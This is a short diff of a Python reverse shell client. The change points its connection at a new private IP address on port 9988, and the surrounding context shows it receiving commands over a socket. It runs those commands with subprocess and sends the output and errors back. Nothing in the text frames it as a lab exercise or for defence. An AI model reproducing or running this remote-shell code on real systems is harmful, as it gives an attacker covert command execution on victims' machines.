@@ -2,7 +2,7 @@ import subprocess
 import socket
 import os
 
-HOST = "192.168.135.60"
+HOST = "192.168.56.1"
 PORT = 9988
 
 client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -19,7 +19,6 @@ while True:
         stdout,stderr = task.communicate()
         data = stdout.decode() + stderr.decode() #gives the error
         client.send(data.encode('ascii'))
-
     except:
         client.close()
         active = False
